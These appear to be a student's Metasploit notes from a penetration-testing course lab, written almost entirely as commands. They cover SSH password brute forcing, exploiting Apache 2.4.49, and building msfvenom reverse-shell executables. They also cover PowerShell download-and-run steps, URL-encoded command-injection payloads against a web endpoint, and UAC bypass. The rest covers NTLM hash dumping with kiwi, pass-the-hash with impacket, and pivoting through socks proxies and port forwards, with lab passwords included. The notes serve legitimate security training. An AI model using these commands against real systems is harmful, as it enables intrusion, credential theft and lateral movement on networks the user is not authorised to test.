
```
sudo msfdb init
```

start at boot time
```
sudo systemctl enable postgresql
sudo msfconsole
```

from msf6
```
`db_status
help
```

use workspaces to keep assessments separate in the db
```
workspace
workspace -a pen200 # create workspace
```

if db breaks you can do 
```
sudo msfdc reinit
```

display categories
```
show -h
```

### Database Backend commands

scan with nmap (give detailed info)
```
db_nmap -A 192.168.221.202
```

discover hosts
```
hosts
```

discover services on found hosts by port
```
services -p 445
```

get all services
```
services
```

### auxiliary modules
- protocol enumeration, port scanning, fuzzing, sniffing etc
- information gathering (under the gather/ hierarchy), scanning and enumeration of various services (under the scanner/ hierarchy)
```
show auxiliary
search type:auxiliary smb
```

activate a module
```
show 56
msf6 auxiliary(scanner/smb/smb_version) > info
msf6 auxiliary(scanner/smb/smb_version) > show options
```

set host two ways
```
set RHOSTS 192.168.221.202
services -p 445 --rhosts
run
```

auto detect vulnerabilities
```
vulns
search type:auxiliary ssh
use 15
show options
set PASS_FILE /usr/share/wordlists/rockyou.txt
set USERNAME george
set RHOSTS 192.168.221.201
set RPORT 2222
run
```

outputs Success: 'george:chocolate' and starts a session
now display the creds we have just gathered
```
creds
```

### exploit modules
```
192.168.221.16

workspace -a exploits
```

search for a specific vulnerability
```
search Apache 2.4.49
use 0
```

check payload options and set
```
show options
set payload payload/linux/x64/shell_reverse_tcp
```

set lhost for the reverse shell (port is automatically set at 4444)
```
set LHOST 192.168.45.181
set SSL false
set RPORT 80
set RHOSTS 192.168.221.16
run
```

this starts up a session in foreground
send to bg with `ctrl-z`

list sessions
```
sessions -l
```

interact with session
```
sessions -i 2
```

kill a session 
```
sessions -k
```

can run the exploit as job
```
run -j
```

### metasploit payloads
- staged payload: exploit and full shell code sent together and can avoid antivirus detection, generally more stable but larger
- nonstaged payload: sent in two parts, first part just has machine connect back to attacker, secondary part contains the rest of the shell code
```
search Apache 2.4.49
use 0
show payloads # a / determines if the payload is staged or not
```

staged:` payload/linux/x86/meterpreter/reverse_tcp`
unstaged: `payload/linux/x86/meterpreter_reverse_tcp`
- x86 = 32 bit
- x64 = 64 bit

### meterpreter payloads
- using a regluar payload you only get regular commmand shell and cannot do complex things
- non staged 64 bit tcp reverse shell: payload/linux/x64/meterpreter_reverse_tcp
```
meterpreter > sysinfo
meterpreter > shell
ctrl-z to background the shell
```

download something to kali
```
meterpreter > lpwd
/home/kali
meterpreter > lcd /home/kali/Downloads
meterpreter > download /etc/passwds
```

upload something to kali
```
meterpreter > upload /usr/bin/unix-privesc-check /tmp/
```

find a file
```
meterpreter > search -f passwords
```

### executable payloads
- create payloads with msvenom
- create windows reverse shell

list available payloads
```
msfvenom -l payloads --platform windows --arch x64
```

create unstaged payload
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.181 LPORT=443 -f exe -o nonstaged.exe
```

log onto the windows machine, and serve up the payload file on kali
```
xfreerdp /u:justin /p:SuperS3cure1337# /v:192.168.227.202
```

from powershell, grab the file we are serving up
```
iwr -uri http://192.168.45.181/nonstaged.exe -Outfile nonstaged.exe
```

execute payload once we have a listener started on kali
```
.\nonstaged.exe
```

try the same thing with a staged payload
```
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.181 LPORT=443 -f exe -o staged.exe
```

with the staged payload, we can't execute any commands on the reverse shell
to get the console to work, we can use msfconsole (needed for any staged) (multi/handler module)
```
sudo msfconsole
use multi/handler
set payload windows/x64/shell/reverse_tcp
set LHOST 192.168.45.181
set LPORT 443
run
```

- for staged and other advanced payloads like meterpreter, netcat does not work
- we need to use metasploit to start a listener for the reverse shell

to run as background job
```
run -j
```

;ist out jobs
```
jobs
```

interact with session again
```
sessions -i <session_number>
```

### VM 2 - get php reverse shell
```
msfvenom -l payloads --arch x64 | grep php
```

lets try a staged reverse tcp 
```
php/meterpreter/reverse_tcp
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.45.181 LPORT=443 -f raw -o reverse-met.php
```

download the file onto the filesystem
```
curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.227.189:8000/archive
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.227.189:8000/archive
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.181%2Freversemet.pHP%22)%3B.\reversemet.pHP' http://192.168.227.189:8000/archive
```

set up meterpreter to catch shell
```
sudo msfconsole
use multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.45.181
set LPORT 443
```

execute uploaded script (note this did not work and I had to just upload the file)
```
curl -X POST --data 'Archive=git%3Bdir' http://192.168.227.189:8000/archive
curl -X POST --data 'Archive=git%3B.\reversemet.pHP' http://192.168.227.189:8000/archive

cat C:\xampp\passwords.txt
```

### Post exploitation

create non-staged windows payload
```
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.181 LPORT=443 -f exe -o met.exe 
```

in msfconsole
```
set payload windows/x64/meterpreter_reverse_https
set LPORT 443
run
```

connect to bind shell on target and download the file
```
nc 192.168.227.223 4444
powershell
iwr -uri http://192.168.45.181/met.exe -Outfile met.exe
.\met.exe
```

in meterpreter shell - how long user has been idle. should be one of the first commands run
```
idletime
```

we want to see if the user has SeImpersonatePrivilege or SeDebugPrivilege
```
shell
whoami /priv
```

- they have impersonatePrivilage so let's elevate using getsystem (meterpreter command)
- getsystem uses named pipe impersonation
- the legitimate named pipe technique is built into the Windows OS to facilitate communications between processes. The pipe technique uses a file to exchange messages between the two processes
```
getuid
getsystem
getuid
```
- another thing to do is switch processes in case ours is closed or detected
- note you need to use getsystem to elevate before you can switch
- you can only migrate to procesesses with same or lower integrity and priv level than current process
```
ps 
migrate <processid>
getuid # note that switching processes switches to the user running that process
```
Instead of migrating to an existing process or a situation in which we won't find any suitable processes to migrate to, we can use the execute Meterpreter command. This will create a new process
```
execute -H -f notepad
migrate 5240
```

get an env
```
getenv flag
```

### post exploitation modules
- most attacks will give unprivileged shell. but if the user is member of localAdministrators group then we can try to elevate by getting past UAC
- must determine if you have medium integrity level first
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/integrity-levels
- to diplay process integrity level we can use NtObjectmManager (PS) or ProcessExplorer (GUI)
```
shell
powershell -ep bypass
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel # returns medium
```

background sessions
```
ctrl-z on powershell
bg on meterpreter
```
 
search for UAC bypass modules in meterpreter (UAC = user account control)
```
search UAC
```

One very effective UAC bypass on modern Windows systems is exploit/windows/local/bypassuac_sdclt, which targets the Microsoft binary sdclt.exe
This binary can be abused to bypass UAC by spawning a process with integrity level High

```
use exploit/windows/local/bypassuac_sdclt
show options
set SESSION 7 (find number by running sessions to bind to our session)
set LHOST 192.168.119.4
run
```

now if we open a shell and get the tokenIntegrityLevel, it says High
we can background the sessions again and load modules
```
use exploit/multi/handler
run
getsystem
```

get some NTLM hashes (use kiwi, provides same functionality as mimikatz)
```
load kiwi
help 
creds_msv (kiwi option)
```

enum host file
```
search host
use post/windows/gather/enum_hostfile
```

pivoting with metasploit
```
nc 192.168.225.223 4444
```

look for other networks to find other machines
```
ipconfig
```

create non-staged windows payload and download on host
```
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.181 LPORT=443 -f exe -o met.exe 
iwr -uri http://192.168.45.181/met.exe -Outfile met.exe
```

in msfconsole
```
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LPORT 443
run
bg # once connected
```

add the subnet from the eth interface we found, plus the backgrounded session id
this creates a path to the internal network so we can enumerate it
```
route add 172.16.110.0/24 10
route print
```

prep scan
```
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.110.200 # choosing one ip vs whole subnet to save time
set PORTS 445,3389
run
```

once open ports are confirmed, we can try to access smb
```
use exploit/windows/smb/psexec 
set SMBUser luiza
set SMBPass "BoccieDearAeroMeow1!"
set RHOSTS 172.16.110.200
set payload windows/x64/meterpreter/bind_tcp
set LPORT 8000
run
```

instead of adding a route manually, this automatically finds and adds subnets
```
use multi/manage/autoroute
show options
sessions -l
set session 10
run
```

instead of using psexec, we can use socks proxy
```
use auxiliary/server/socks_proxy 
show options
set SRVHOST 127.0.0.1
set VERSION 5
run -j
```

edit /etc/proxychains4.conf
```
socks5 127.0.0.1 1080
```

access the internal machine using proxychains and freerdp
```
sudo proxychains xfreerdp /v:172.16.110.200 /u:luiza
```

similar technique is to use a port forward
```
sessions -i 10
portfwd add -l 3389 -p 3389 -r 172.16.110.200
sudo xfreerdp /v:127.0.0.1 /u:luiza /p:BoccieDearAeroMeow1!
```
### automating metasploit with resource scripts
- resource scripts chain commands together
- create a script in kali home dir - listener.rc
- AutoRunScript option automatically executes a module after a session was created
- use migrate to migrate to a new notepad.exe process
- set ExitOnSession to false to ensure that the listener keeps accepting new connections after a session is created
- run -j (background), -z (don't automatically connect)
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.45.181
set LPORT 443
set AutoRunScript post/windows/manage/migrate 
set ExitOnSession false
run -z -j
```

run the script
```
sudo msfconsole -r listener.rc
```

connect to target
```
sudo xfreerdp /v:192.168.225.202 /u:justin /p:SuperS3cure1337#
iwr -uri http://192.168.45.181/met.exe -Outfile met.exe
.\met.exe
```

can use prebuilt resource scripts
```
ls -l /usr/share/metasploit-framework/scripts/resource
sudo msfconsole -r /usr/share/metasploit-framework/scripts/resource/portscan.rc
set RHOSTS 192.168.225.202
```
### capstone
```
192.168.225.225 192.168.225.226
db_nmap -A 192.168.225.225
db_nmap -A 192.168.225.226
hosts
services -p 8080
search NiFi
use exploit/multi/http/apache_nifi_processor_rce
```

select windows over unix by doing
```
show targets
set target 1
```

get powershell shell
```
set payload payload/cmd/windows/powershell/x64/powershell_reverse_tcp
```

get meterpreter shell
```
set payload payload/cmd/windows/powershell/x64/meterpreter/reverse_tcp
```

```
getsystem
```

get some NTLM hashes
```
load kiwi
creds_msv

impacket-wmiexec -hashes 00000000000000000000000000000000:445414c16b5689513d4ad8234391aacf itwk04admin@192.168.225.226
```

